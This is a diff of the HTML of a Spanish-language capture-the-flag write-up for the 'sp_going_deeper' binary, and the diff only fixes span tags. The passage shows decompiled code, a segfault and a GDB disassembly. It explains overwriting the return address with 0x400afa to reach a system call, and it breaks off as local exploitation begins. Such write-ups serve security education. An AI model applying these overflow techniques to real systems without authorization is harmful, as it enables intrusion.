@@ -55,7 +55,7 @@ RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
 <span class="code-blue">1. Disable mechanisms ⚙️</span>
 <span class="code-blue">2. Login ✅</span>
 <span class="code-blue">3. Exit 🏃</span>
-<span class="code-blue">&gt;&gt;
+<span class="code-blue">&gt;&gt;</span>
 </code></pre></div><p>En este punto, vamos a abrir el binario en Ghidra para analizar el código en C descompilado. Esta es la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8 mtku">undefined8</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
 <span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
 <span class="mtk1">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>
@@ -126,14 +126,14 @@ RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
 
 <span class="code-red">[!] For security reasons, you are logged out..</span>
 
-<span class="code-red">zsh: segmentation fault (core dumped)  ./sp_going_deeper
+<span class="code-red">zsh: segmentation fault (core dumped)  ./sp_going_deeper</span>
 </code></pre></div><p>El programa se rompe, lo que significa que la dirección de retorno se ha modificado y el flujo de ejecución se ha corrompido. Vamos a ver en GDB cómo podemos controlar la dirección de retorno:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">sp_going_deeper</span>
 Reading symbols from <span class="code-dark-green">sp_going_deeper</span>...
 (No debugging symbols found in <span class="code-dark-green">sp_going_deeper</span>)
 <span class="code-red">gef➤  </span>disassemble admin_panel
 Dump of assembler code for function admin_panel:
    ...
-   </span><span class="code-dark-blue">0x0000000000400aba</span> &lt;+209&gt;:   call   <span class="code-dark-blue">0x400730</span> &lt;<span class="code-dark-yellow">read@plt</span>&gt;
+   <span class="code-dark-blue">0x0000000000400aba</span> &lt;+209&gt;:   call   <span class="code-dark-blue">0x400730</span> &lt;<span class="code-dark-yellow">read@plt</span>&gt;
    <span class="code-dark-blue">0x0000000000400abf</span> &lt;+214&gt;:   mov    eax,0xdeadbeef
    <span class="code-dark-blue">0x0000000000400ac4</span> &lt;+219&gt;:   cmp    QWORD PTR [rbp-0x38],rax
    <span class="code-dark-blue">0x0000000000400ac8</span> &lt;+223&gt;:   jne    <span class="code-dark-blue">0x400b20</span> &lt;<span class="code-dark-yellow">admin_panel</span>+311&gt;
@@ -155,7 +155,7 @@ Dump of assembler code for function admin_panel:
    <span class="code-dark-blue">0x0000000000400b12</span> &lt;+297&gt;:   lea    rdi,[rip+0xaa5]        # <span class="code-dark-blue">0x4015be</span>
    <span class="code-dark-blue">0x0000000000400b19</span> &lt;+304&gt;:   call   <span class="code-dark-blue">0x400700</span> &lt;<span class="code-dark-yellow">system@plt</span>&gt;
    ...
-</span>End of assembler dump.
+End of assembler dump.
 </code></pre></div><p>Estaré usando la dirección <code>0x400afa</code>. Para poder enviar esta dirección, tiene que estar formateada como bytes (<em>little-endian</em>). Vamos a explotarlo localmente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">sp_going_deeper</span>
 Reading symbols from <span class="code-dark-green">sp_going_deeper</span>...
 (No debugging symbols found in <span class="code-dark-green">sp_going_deeper</span>)
